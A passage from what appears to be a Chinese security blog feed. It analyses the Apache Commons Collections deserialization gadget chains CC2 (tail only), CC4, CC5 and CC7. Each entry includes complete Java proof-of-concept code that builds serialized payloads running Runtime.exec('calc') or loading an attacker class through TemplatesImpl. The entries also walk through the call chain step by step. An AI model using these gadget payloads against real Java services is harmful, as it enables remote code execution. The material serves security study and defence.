class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformingComparator,<span class="string">&quot;transformer&quot;</span>,invokerTransformer);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;sercc2.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object,String field_name,Object filed_value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Class clazz=object.getClass();</span><br><span class="line">        Field declaredField=clazz.getDeclaredField(field_name);</span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        declaredField.set(object,filed_value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;sercc2.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>首先还是PriorityQueue的readObject()方法</li>
<li>然后是PriorityQueue的heapify()方法</li>
<li>PriorityQueue的siftDown()方法</li>
<li>PriorityQueue.siftDownUsingComparator()方法</li>
<li>然后是TransformingComparator.compare()方法</li>
<li>InvokerTransformer.transform()方法,这里参数是构造的templates,先获取TemplatesImpl的newTransformer()方法,然后调用了<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231113184456.png" alt="Pasted image 20231113184456.png"><br>再随后就是CC4后面的defindCLass了</li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA反序列化之CC4链分析</title>
    <url>/2024/05/07/CC4/</url>
    <content><![CDATA[<p>因为 CommonsCollections4 除 4.0 的其他版本去掉了 InvokerTransformer 不再继承 Serializable，导致无法序列化<br>同时 CommonsCollections 4的版本 TransformingComparator 继承了 Serializable接口</p>
<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">    PriorityQueue.heapify()  </span><br><span class="line">        PriorityQueue.siftDown()</span><br><span class="line">            PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                TransformingComparator.compare()</span><br><span class="line">                    ChainedTransformer.transform()</span><br><span class="line">                        InstantiateTransformer.transform()</span><br><span class="line">                            TemplatesImpl.newTransformer()</span><br><span class="line">								TemplatesImpl#getTransletInstance()</span><br><span class="line">			      					TemplatesImpl#defineTransletClasses()</span><br><span class="line">			        					TransletClassLoader#defineClass()</span><br><span class="line">                                			defineClass()-&gt;newInstance()</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>CC4不再依靠LazyMap.get()调用.transform()方法<br>而是用TransformingComparator.compare() 调用<br>后面就是 TemplatesImpl加载恶意类了<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231113163250.png" alt="Pasted image 20231113163250.png"></p>
<p>我们alt+f7查找谁调用compare(),找到PriorityQueue 优先队列类<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231113164019.png" alt="Pasted image 20231113164019.png"></p>
<p>这里有一个坑点是PriorityQueue.heapify()方法里<br>我们要进入循环执行siftDown()方法但是size的大小有条件的:<code>(size&gt;&gt;&gt;1)-1&gt;=0</code><br>而2&gt;&gt;&gt;1=1刚好满足,所以我们需要往队列里加两个元素<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">priorityQueue.add(1);</span><br><span class="line">priorityQueue.add(2);</span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231113164725.png" alt="Pasted image 20231113164725.png"></p>
<h3 id="poc及过程分析"><a href="#poc及过程分析" class="headerlink" title="poc及过程分析"></a>poc及过程分析</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;1vxyz&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\JavaProject\\easyjava\\src\\main\\java\\com\\butler\\springboot14shiro\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="comment">//transformingComparator.compare(1,2);</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformingComparator,<span class="string">&quot;transformer&quot;</span>,chainedTransformer);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;sercc4.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object,String field_name,Object filed_value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Class clazz=object.getClass();</span><br><span class="line">        Field declaredField=clazz.getDeclaredField(field_name);</span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        declaredField.set(object,filed_value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;sercc4.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先unserialize进入PriorityQueue.readObject()<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231113165339.png" alt="Pasted image 20231113165339.png"></p>
<p>最后一行执行heapify(),也就是PriorityQueue.heapify()<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231113165402.png" alt="Pasted image 20231113165402.png"></p>
<p>进入循环执行PriorityQueue.siftDown()<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231113165425.png" alt="Pasted image 20231113165425.png"></p>
<p>我们在构造函数时传入了comparator,它是TransformingComparator类型的<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231113165535.png" alt="Pasted image 20231113165535.png"></p>
<p>因此执行 PriorityQueue.siftDownUsingComparator()<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231113165607.png" alt="Pasted image 20231113165607.png"></p>
<p>这里执行comparator.compare(),也就是TransformingComparator.compare()<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231113165721.png" alt="Pasted image 20231113165721.png"></p>
<p>这个transformer在构造函数时先传入了一个无用的<code>new ConstantTransformer(1)</code>,后来又通过反射设置为了构造的恶意chainedTransformer<br>此时会执行 ChainedTransformer.transform()<br>后面和CC3一样了就<br>先 ChainedTransformer.transform()<br>第一次调用ConstantTransformer.transform()返回TrAXFilter.class<br>第二次调用InstantiateTransformer.transform(input),这个input是TrAXFilter.class<br>此时获取TrAXFilter的构造函数(Templates templates)<br>调用newInstance实例化这个TrAXFilter的构造器,传入的参数构造好的<code>new Object[]&#123;templates&#125;</code><br>也就是调用了templates.newTransformer(),这个templates是TemplatesImpl类型的<br>也就是==TemplatesImpl.newTransformer()==<br>随后就是和CC3一样<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#getTransletInstance()</span><br><span class="line">   TemplatesImpl#defineTransletClasses()</span><br><span class="line">     TransletClassLoader#defineClass()</span><br><span class="line">   Class#newInstance()</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA反序列化之CC5链分析</title>
    <url>/2024/05/07/CC5/</url>
    <content><![CDATA[<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">       ObjectInputStream.readObject()</span><br><span class="line">           BadAttributeValueExpException.readObject()</span><br><span class="line">               TiedMapEntry.toString()</span><br><span class="line">                   LazyMap.get()</span><br><span class="line">                       ChainedTransformer.transform()</span><br><span class="line">                           ConstantTransformer.transform()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Class.getMethod()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.getRuntime()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.exec()</span><br></pre></td></tr></table></figure>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;jmx0hxq&quot;</span>);</span><br><span class="line">        <span class="comment">//tiedMapEntry.toString();</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> badAttributeValueExpException.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;sercc5.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;sercc5.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>首先BadAttributeValueExpException.readObject()方法,它里面会调用valObj.toString()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231116141021.png" alt="Pasted image 20231116141021.png"></li>
</ul>
<p>这里val变量我们观察代码可以发现已经在后面被反射设置为了我们构造的tiedMapEntry,之所以要通过反射后面修改是因为tiedMapEntry在初始化的时候会调用val.toString()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231116141208.png" alt="Pasted image 20231116141208.png"></p>
<p>因此接下来就是tiedMapEntry.toString()方法:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231116141307.png" alt="Pasted image 20231116141307.png"></p>
<p>调用getValue()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231116141319.png" alt="Pasted image 20231116141319.png"></p>
<p>这里的map是我们构造好的lazyMap<br>LazyMap.get()方法:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231116141412.png" alt="Pasted image 20231116141412.png"></p>
<p>然后后面就是那一段恶意的调用了</p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA反序列化之CC7链分析</title>
    <url>/2024/05/07/CC7/</url>
    <content><![CDATA[<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hashtable.readObject  </span><br><span class="line">Hashtable.reconstitutionPut  </span><br><span class="line">Hashtable.reconstitutionPut  </span><br><span class="line">  LazyMap.equals 没实现，找父类  </span><br><span class="line">     AbstractMapDecorator.equals  </span><br><span class="line">        HashMap.equals 没实现，找父类  </span><br><span class="line">           AbstractMap.equals  </span><br><span class="line">              LazyMap.get  </span><br><span class="line">   ChainedTransformer.transform()</span><br><span class="line">                    ConstantTransformer.transform()  </span><br><span class="line">                    InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>我们的目标是<code>LazyMap.get()</code>方法,这个链子是通过<code>AbstractMap</code>的equals方法触发的<br>我们先看一下这个方法:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240507173526.png" alt="image.png"></p>
<p>被比较的方法要是Map类型的对象,被比较的对象要和this的大小size相同,后面就是取this的键值对赋给e变量,然后的if判断不管value是否为null都会调用<code>m.get(key)</code>方法,这个就是这条链子的一个地方</p>
<p>eg.<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">lazymapget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">// 传入Runtime类</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// 使用Runtime.class.getMethod()反射调用Runtime.getRuntime()</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">// invoke()调用Runtime.class.getMethod(&quot;getRuntime&quot;).invoke(null)</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">// 调用exec(&quot;calc&quot;)</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//new两个不同的HashMap对象，保证两个HashMap对象不同</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//new 两个LazyMap对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(map1, chain);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(map2, chain);</span><br><span class="line">        <span class="comment">//Map对象需要设置value和key值</span></span><br><span class="line">        lazyMap1.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;3&quot;</span>,<span class="string">&quot;4&quot;</span>);</span><br><span class="line">        lazyMap1.equals(lazyMap2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们调试一下,首先是lazyMap1的equals方法,lazymap没有equals方法,去它的父类<code>AbstractMapDecorator</code>找<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240507175646.png" alt="image.png"><br>这里肯定不是this,去调用<code>this.map.equals(object)</code>,<code>this.map</code>是lazymap1的hashmap,hashmap没有equals方法,去它的父类<code>AbstractMap</code>找<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240507175755.png" alt="image.png"><br>这里前面说了肯定会调用<code>m.get(key)</code>方法,m就是传入的被比较的o对象,也就是lazymap2<br>key是lazymap1的hashmap遍历键值对得到的键<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240507175923.png" alt="image.png"></p>
<p>因此会调用<code>lazymap2.get(key)</code>方法,然后就是lazymap.get方法rce了<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240507180012.png" alt="image.png"></p>
